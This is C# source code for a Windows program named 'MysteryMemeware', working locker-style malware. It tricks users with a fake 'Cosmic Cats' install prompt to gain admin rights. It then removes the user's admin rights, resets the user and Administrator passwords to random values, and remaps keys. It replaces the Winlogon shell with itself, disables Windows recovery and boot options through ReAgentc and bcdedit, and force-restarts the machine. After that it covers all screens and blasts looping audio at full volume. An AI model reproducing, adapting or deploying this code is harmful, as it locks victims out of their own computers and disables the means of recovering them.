using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Media;
using Microsoft.Win32;
namespace MysteryMemeware
{
    public static class Program
    {
        public static readonly string CurrentExePath = typeof(Program).Assembly.Location;
        public static readonly string CurrentExeFolder = Path.GetDirectoryName(CurrentExePath);
        public static readonly string System32Folder = StringHelper.ReplaceCaseless(Environment.GetFolderPath(Environment.SpecialFolder.System), "System32", "Sysnative");
        public static readonly string System64Folder = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
        public static readonly string SystemFolder = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public const string MemeMusicResourceName = "MysteryMemeware.Music.wav";
        public static readonly string InstallLocation = SystemFolder + "\\Shell.exe";
        public const string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
        public const string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
        public const string UserPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\UserPassword";
        public static readonly string[] trueStrings = new string[] { "true", "yes", "1", "y", "t" };
        public static void Main()
        {
            try
            {
                if (IsInstalled())
                {
                    if (ProcessHelper.IsAdmin())
                    {
                        Run();
                    }
                    else
                    {
                        try
                        {
                            ElevateSelf();
                        }
                        catch
                        {
                            Run();
                        }
                    }
                }
                else
                {
                    if (ProcessHelper.IsAdmin())
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
                Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                string exMessage = "Unknown exception thrown.";
                if (ex is not null)
                {
                    exMessage = $"{ex.GetType().FullName} thrown at {ex.TargetSite.Name} with message {ex.Message}. {ex.StackTrace}";
                }
                MessageBox.Show(exMessage);
            }
        }
        public static bool IsInstalled()
        {
            try
            {
                object isInstalledObject = RegistryHelper.GetRegistryValue(new RegistryValueRefrence(IsInstalledRegistryPath));
                if (isInstalledObject is null)
                {
                    return false;
                }
                Type typeOfIsInstalled = isInstalledObject.GetType();
                if (typeOfIsInstalled == typeof(string))
                {
                    return StringHelper.MatchesArrayCaseless((string)isInstalledObject, trueStrings);
                }
                if (typeOfIsInstalled == typeof(long))
                {
                    return (long)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(int))
                {
                    return (int)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(bool))
                {
                    return (bool)isInstalledObject;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        public static void ElevateSelf()
        {
            object adminPasswordObject = RegistryHelper.GetRegistryValue(new RegistryValueRefrence(AdminPasswordRegistryPath));
            if (adminPasswordObject is null || adminPasswordObject.GetType() != typeof(string))
            {
                throw new Exception("Failed to load admin password.");
            }
            string adminPassword = (string)adminPasswordObject;
            string currentExePath = CurrentExePath;
            ProcessHelper.StartAs(new TerminalCommand($"\"{currentExePath}\""), new UsernameDomainPair("Administrator"), adminPassword, WindowMode.Default, Path.GetDirectoryName(currentExePath));
        }
        public static void BegForAdmin()
        {
            if (MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", MessageBoxButtons.YesNo) == DialogResult.No)
            {
                return;
            }
            if (MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                return;
            }
            ProcessHelper.Start(new TerminalCommand(CurrentExePath, ""), WindowMode.Default, true, CurrentExeFolder);
        }
        public static void Install()
        {
            if (File.Exists(InstallLocation))
            {
                File.Delete(InstallLocation);
            }

            File.Copy(CurrentExePath, InstallLocation);

            UserHelper.RemoveAdmin(UserHelper.CurrentUsername);

            UserHelper.ActivateUser("Administrator");

            string newUserPassword = UserHelper.GeneratePassword();

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(UserPasswordRegistryPath), newUserPassword, RegistryValueKind.String);

            UserHelper.ChangeUserPassword(UserHelper.CurrentUsername, newUserPassword);

            string newAdminPassword = UserHelper.GeneratePassword();

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(AdminPasswordRegistryPath), newUserPassword, RegistryValueKind.String);

            UserHelper.ChangeUserPassword("Administrator", newAdminPassword);

            byte[] scancodeMap = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Keyboard Layout"), scancodeMap, RegistryValueKind.Binary);
            
            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience"), 1, RegistryValueKind.DWord);
            
            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"), InstallLocation, RegistryValueKind.String);
            
            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName"), UserHelper.CurrentUsername, RegistryValueKind.String);
            
            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword"), newUserPassword, RegistryValueKind.String);
            
            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon"), 1, RegistryValueKind.DWord);

            RunCommand(System32Folder + "\\ReAgentc.exe", "/disable");

            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard", true); 

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled"), 0, RegistryValueKind.DWord);

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate"), 0, RegistryValueKind.DWord);

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions"), 1, RegistryValueKind.DWord);

            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(IsInstalledRegistryPath), "true", RegistryValueKind.String);

            RunCommand(System32Folder + "\\shutdown.exe", "/r /f /t 0", false);
        }
        public static void RunCommand(string filePath, string arguments, bool elevate = true)
        {
            ProcessHelper.AwaitSuccess(ProcessHelper.Start(new TerminalCommand(filePath, arguments), WindowMode.Hidden, elevate, Path.GetDirectoryName(filePath)), 300000000, TimeoutAction.KillAndThrow, true);
        }
        public static void Run()
        {
            System.Windows.Forms.Timer volumeTimer = new()
            {
                Interval = 250,
                Tag = null
            };
            volumeTimer.Tick += (object sender, EventArgs e) =>
            {
                VolumeHelper.SetVolume(1);
                VolumeHelper.SetMute(false);
            };
            volumeTimer.Enabled = true;
            volumeTimer.Start();
            int screenCount = Screen.AllScreens.Length;
            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
            {
                int localScreenIndex = screenIndex;
                Thread thread = new(() =>
                {
                    DisplayCoverForm form = new(localScreenIndex);
                    form.ShowDialog();
                });
                thread.Start();
            }
            SoundPlayer soundPlayer = new(typeof(Program).Assembly.GetManifestResourceStream(MemeMusicResourceName));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
    }
}